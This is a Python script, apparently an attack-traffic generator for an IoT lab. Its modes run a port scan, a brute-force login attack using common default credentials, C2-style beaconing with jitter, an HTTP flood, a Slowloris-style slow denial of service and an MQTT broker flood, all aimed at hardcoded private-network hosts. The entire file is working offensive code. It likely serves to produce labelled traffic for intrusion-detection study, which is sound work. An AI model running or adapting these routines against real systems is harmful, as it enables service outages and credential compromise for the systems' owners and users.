import argparse
import random
import socket
import string
import time

GATEWAY_IP = "172.30.0.10"
MQTT_IP = "172.30.0.20"
C2_IP = "172.30.0.100"

def rand_text(size):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(size))

def send_http(host, port, path="/", method="GET", body=""):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((host, port))

        if method.upper() == "POST":
            req = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Connection: close\r\n\r\n"
                f"{body}"
            )
        else:
            req = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Connection: close\r\n\r\n"
            )

        s.sendall(req.encode())
        try:
            s.recv(512)
        except Exception:
            pass
        s.close()
    except Exception:
        pass

def scan(args):
    print("[RODADA5] scan")
    ports = [80, 443, 8080, 8081, 1883, 9090, 22, 21, 23, 25, 53, 110, 143, 3306, 5432]
    for r in range(args.rounds):
        random.shuffle(ports)
        for port in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                s.connect_ex((GATEWAY_IP, port))
                s.close()
            except Exception:
                pass
            time.sleep(args.delay)
    print("[OK] scan finalizado")

def bruteforce(args):
    print("[RODADA5] bruteforce")
    users = ["admin", "root", "iot", "sensor", "operator", "guest", "mqtt", "support"]
    passwords = ["admin", "123456", "password", "iot123", "root", "toor", "senha123", "operator"]
    for i in range(args.count):
        user = random.choice(users)
        password = random.choice(passwords)
        body = '{"user":"' + user + '","password":"' + password + '","try":' + str(i) + '}'
        send_http(GATEWAY_IP, 8081, "/login", "POST", body)
        time.sleep(args.delay)
    print("[OK] bruteforce finalizado")

def c2(args):
    print("[RODADA5] c2_beacon")
    for i in range(args.count):
        body = '{"device":"sensor03","status":"alive","seq":' + str(i) + ',"data":"' + rand_text(args.payload_size) + '"}'
        send_http(C2_IP, 9090, "/beacon", "POST", body)
        jitter = random.uniform(0, args.jitter)
        time.sleep(args.interval + jitter)
    print("[OK] c2 finalizado")

def flood(args):
    print("[RODADA5] dos_flood")
    for i in range(args.count):
        body = '{"temp":' + str(random.randint(20, 90)) + ',"payload":"' + rand_text(args.payload_size) + '"}'
        send_http(GATEWAY_IP, 8080, "/telemetry", "POST", body)
        time.sleep(args.delay)
    print("[OK] flood finalizado")

def slow_dos(args):
    print("[RODADA5] slow_dos")
    sockets = []

    for i in range(args.connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((GATEWAY_IP, 8080))
            s.sendall(b"POST /telemetry HTTP/1.1\r\n")
            s.sendall(f"Host: {GATEWAY_IP}\r\n".encode())
            s.sendall(b"Content-Type: application/json\r\n")
            s.sendall(b"Content-Length: 100000\r\n")
            sockets.append(s)
        except Exception:
            pass
        time.sleep(args.conn_delay)

    for c in range(args.chunks):
        for s in list(sockets):
            try:
                s.sendall(("X-" + rand_text(args.payload_size) + "\r\n").encode())
            except Exception:
                try:
                    sockets.remove(s)
                except Exception:
                    pass
        time.sleep(args.chunk_delay)

    time.sleep(args.hold_time)

    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

    print("[OK] slow_dos finalizado")

def mqtt_abuse(args):
    print("[RODADA5] mqtt_abuse")
    try:
        import paho.mqtt.client as mqtt
    except Exception as e:
        print("[ERRO] paho-mqtt não encontrado:", e)
        return

    for c in range(args.connections):
        client_id = "rodada5_abuse_" + str(c) + "_" + rand_text(6)
        client = mqtt.Client(client_id=client_id)

        try:
            client.connect(MQTT_IP, 1883, 60)
            client.loop_start()

            for m in range(args.messages_per_conn):
                topic = f"iot/abuse/topic_{random.randint(1, args.topics)}"
                payload = rand_text(args.payload_size)
                client.publish(topic, payload=payload, qos=0)
                time.sleep(args.msg_delay)

            client.loop_stop()
            client.disconnect()
        except Exception as e:
            print("[ALERTA] erro mqtt:", e)

        time.sleep(args.conn_delay)

    print("[OK] mqtt_abuse finalizado")

def main():
    parser = argparse.ArgumentParser()
    sub = parser.add_subparsers(dest="mode", required=True)

    p = sub.add_parser("scan")
    p.add_argument("--rounds", type=int, default=8)
    p.add_argument("--delay", type=float, default=0.03)

    p = sub.add_parser("bruteforce")
    p.add_argument("--count", type=int, default=80)
    p.add_argument("--delay", type=float, default=0.04)

    p = sub.add_parser("c2")
    p.add_argument("--count", type=int, default=35)
    p.add_argument("--interval", type=float, default=0.7)
    p.add_argument("--jitter", type=float, default=0.5)
    p.add_argument("--payload-size", type=int, default=80)

    p = sub.add_parser("flood")
    p.add_argument("--count", type=int, default=500)
    p.add_argument("--delay", type=float, default=0.01)
    p.add_argument("--payload-size", type=int, default=180)

    p = sub.add_parser("slow_dos")
    p.add_argument("--connections", type=int, default=70)
    p.add_argument("--chunks", type=int, default=8)
    p.add_argument("--chunk-delay", type=float, default=1.0)
    p.add_argument("--hold-time", type=float, default=20)
    p.add_argument("--payload-size", type=int, default=40)
    p.add_argument("--conn-delay", type=float, default=0.03)

    p = sub.add_parser("mqtt_abuse")
    p.add_argument("--connections", type=int, default=80)
    p.add_argument("--messages-per-conn", type=int, default=6)
    p.add_argument("--topics", type=int, default=12)
    p.add_argument("--payload-size", type=int, default=220)
    p.add_argument("--msg-delay", type=float, default=0.01)
    p.add_argument("--conn-delay", type=float, default=0.02)

    args = parser.parse_args()

    if args.mode == "scan":
        scan(args)
    elif args.mode == "bruteforce":
        bruteforce(args)
    elif args.mode == "c2":
        c2(args)
    elif args.mode == "flood":
        flood(args)
    elif args.mode == "slow_dos":
        slow_dos(args)
    elif args.mode == "mqtt_abuse":
        mqtt_abuse(args)

if __name__ == "__main__":
    main()
